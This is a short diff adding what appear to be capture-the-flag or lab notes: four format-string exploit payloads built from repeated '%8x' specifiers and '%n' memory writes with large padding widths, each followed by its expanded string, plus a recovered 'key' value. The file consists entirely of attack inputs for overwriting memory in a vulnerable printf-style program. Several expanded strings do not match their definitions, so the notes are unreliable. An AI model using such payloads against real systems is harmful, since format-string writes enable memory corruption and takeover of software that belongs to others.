@@ -1,0 +1,10 @@
+payload1 = '%8x' * 12 + '%134520832x%nAAAA%n'
+%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%134520832x%nAAAA%n
+payload2 = '%8x' * 19 + '%n'
+%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%n%n
+payload3 = '%8x' * 12 + '%134520833x%n'
+%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%134520833x%nAAAAAAAAAAAAAAA
+payload4 = '%8x' * 19 + '%n'
+%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%n
+
+key = 0x9898(=39064)
